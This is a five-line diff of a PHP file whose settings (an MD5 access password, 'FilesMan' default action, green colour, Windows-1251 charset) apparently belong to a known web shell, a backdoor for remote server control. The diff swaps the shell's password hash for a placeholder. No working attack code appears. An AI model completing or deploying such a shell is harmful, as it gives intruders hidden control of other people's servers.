@@ -1,5 +1,5 @@
 <?php #v2.3		//Version
-$auth_pass = "a5f1230da7d99cb20d250c77decb1271"; 	//a5f1230da7d99cb20d250c77decb1271 
+$auth_pass = "sadfasdfsadfasdfasdf"; 	//md5(pass) 
 $color = "#00FF66";	//Colour
 $default_action = "FilesMan";
 $default_charset = "Windows-1251";
